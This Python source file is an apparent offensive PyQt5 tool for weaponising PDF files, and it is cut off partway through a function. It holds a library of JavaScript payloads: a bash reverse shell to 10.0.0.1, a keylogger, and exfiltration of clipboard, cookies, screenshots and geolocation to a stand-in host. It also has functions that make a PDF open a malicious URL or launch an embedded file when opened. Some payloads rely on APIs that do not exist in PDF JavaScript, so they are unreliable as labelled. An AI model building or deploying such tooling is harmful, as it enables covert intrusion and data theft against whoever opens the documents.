import sys
import os
import PyPDF4
from PyPDF4.generic import (
    DictionaryObject,
    NameObject,
    TextStringObject,
    EncodedStreamObject,
    ArrayObject,
)
from PyQt5.QtWidgets import (
    QApplication,
    QMainWindow,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QRadioButton,
    QFileDialog,
    QWidget,
    QPlainTextEdit,
    QButtonGroup,
    QMessageBox,
    QGroupBox,
    QInputDialog,
)
from PyQt5.QtCore import Qt

js_payloads = {
    "Alert Box": "app.alert('This is an alert box.');",
    "Denial of Service (DoS)": "while (true) { app.alert('DoS attack!'); }",
    "Print Dialog": "this.print();",
    "Open Website": "app.launchURL('https://example.com', true);",
    "Download File": "app.launchURL('https://example.com/secret_document.pdf', true);",
    "Remote Code Execution (RCE)": "var cmd = 'uname -a'; var result = util.printd(exec(cmd)); var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/cmd'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ output: result }));",
    "Reverse Shell": "var cmd = '/bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\''; var result = util.printd(exec(cmd)); console.log(result);",
    "Remote Access": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { console.log(xhr.responseText); } }; xhr.open('GET', 'https://your-website.com/command?cmd=ls', true); xhr.send(null);",
    "Keylogger": "var keystrokes = ''; setInterval(function() { if (keystrokes.length > 0) { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/keystrokes'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ keystrokes: keystrokes })); keystrokes = ''; } }, 10000); this.onKeyDown = function() { keystrokes += event.key; };",
    "Execute Remote JavaScript": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { eval(xhr.responseText); } }; xhr.open('GET', 'https://example.com/remote_script.js', true); xhr.send(null);",
    "Clipboard Data Exfiltration": "navigator.clipboard.readText().then(function(clipboardText) { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/clipboard'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ clipboard: clipboardText })); });",
    "Webcam Access": "navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) { var video = document.createElement('video'); video.srcObject = stream; video.play(); });",
    "Screen Capture": "navigator.mediaDevices.getDisplayMedia({ video: true }).then(function(stream) { var video = document.createElement('video'); video.srcObject = stream; video.play(); setTimeout(function() { var canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight; var ctx = canvas.getContext('2d'); ctx.drawImage(video, 0, 0); var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/screen_capture'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ screenshot: canvas.toDataURL() })); }, 5000); });",
    "Get Geolocation": "if ('geolocation' in navigator) { navigator.geolocation.getCurrentPosition(function(position) { var geolocation = { latitude: position.coords.latitude, longitude: position.coords.longitude }; var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/geolocation'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ geolocation: geolocation })); }); }",
    "List Stored Cookies": "var cookies = document.cookie.split('; ').reduce(function(cookieObj, cookieString) { var keyValue = cookieString.split('='); cookieObj[keyValue[0]] = keyValue[1]; return cookieObj; }, {}); var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/cookies'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ cookies: cookies }));",
    "List Stored Credentials": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { var credentials = xhr.responseText.split('\\n'); for (var i = 0; i < credentials.length; i++) { if (credentials[i]) { console.log('Credential ' + (i + 1) + ': ' + credentials[i]); } } } }; xhr.open('GET', 'https://your-website.com/credentials', true); xhr.send(null);",
    "Get Stored Credentials": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { var credentials = xhr.responseText.split('\\n'); for (var i = 0; i < credentials.length; i++) { if (credentials[i]) { console.log('Credential ' + (i + 1) + ': ' + credentials[i]); } } } }; xhr.open('GET', 'https://your-website.com/credentials', true); xhr.send(null);",
    "Get Browser History": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { var history = xhr.responseText.split('\\n'); for (var i = 0; i < history.length; i++) { if (history[i]) { console.log('History ' + (i + 1) + ': ' + history[i]); } } } }; xhr.open('GET', 'https://your-website.com/history', true); xhr.send(null);",
    "Get Wifi Passwords": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { var wifi_passwords = xhr.responseText.split('\\n'); for (var i = 0; i < wifi_passwords.length; i++) { if (wifi_passwords[i]) { console.log('Wifi Password ' + (i + 1) + ': ' + wifi_passwords[i]); } } } }; xhr.open('GET', 'https://your-website.com/wifi_passwords', true); xhr.send(null);",
    "Play Sound": "var sound = new Sound(); sound.src = 'https://example.com/sound.mp3'; sound.play();",
}

def inject_url(input_pdf, output_pdf, malicious_url):
    # Read the input PDF
    with open(input_pdf, "rb") as file:
        pdf_reader = PyPDF4.PdfFileReader(file)
        pdf_writer = PyPDF4.PdfFileWriter()

        # Set OpenAction to launch the malicious URL when the PDF is opened
        open_action = DictionaryObject({
            NameObject("/Type"): NameObject("/Action"),
            NameObject("/S"): NameObject("/URI"),
            NameObject("/URI"): TextStringObject(malicious_url)
        })

        # Add all pages to the output PDF
        for i in range(len(pdf_reader.pages)):
            pdf_writer.addPage(pdf_reader.pages[i])

        # Add OpenAction to the PDF's root dictionary (catalog)
        pdf_writer._root_object.update({NameObject("/OpenAction"): open_action})

        # Write the output PDF
        with open(output_pdf, "wb") as output_file:
            pdf_writer.write(output_file)

def inject_file(input_pdf, output_pdf, file_to_inject):
    with open(input_pdf, "rb") as file:
        pdf_reader = PyPDF4.PdfFileReader(file)
        pdf_writer = PyPDF4.PdfFileWriter()

        # Add all pages to the output PDF
        for i in range(len(pdf_reader.pages)):
            pdf_writer.addPage(pdf_reader.pages[i])

        # Read the file to be injected
        with open(file_to_inject, "rb") as file_inject:
            file_data = file_inject.read()

        # Create an embedded file with the file data
        ef_stream = EncodedStreamObject()
        ef_stream._data = file_data
        ef_stream.update({
            NameObject("/Type"): NameObject("/EmbeddedFile"),
            NameObject("/Filter"): NameObject("/ASCIIHexDecode")
        })

        # Add the embedded file to the PDF
        file_name = TextStringObject(file_to_inject.split("/")[-1])
        embedded_file = pdf_writer._addObject(ef_stream)
        filespec = DictionaryObject({
            NameObject("/Type"): NameObject("/Filespec"),
            NameObject("/F"): file_name,
            NameObject("/EF"): DictionaryObject({
                NameObject("/F"): embedded_file
            })
        })
        filespec_obj = pdf_writer._addObject(filespec)

        # Add JavaScript to launch the embedded file
        js_code = f"""
        var filePath = this.path.replace(/[^\\/]+$/, '');
        var fileName = '{file_name}';
        var fileSpec = this.getDoc({{ cPath: fileName }});
        this.exportDataObject({{ cName: fileName, nLaunch: 2 }});
        app.launchURL('file:///' + filePath + fileName, true);
        """

        js_text_string = TextStringObject(js_code)

        open_action = DictionaryObject({
            NameObject("/Type"): NameObject("/Action"),
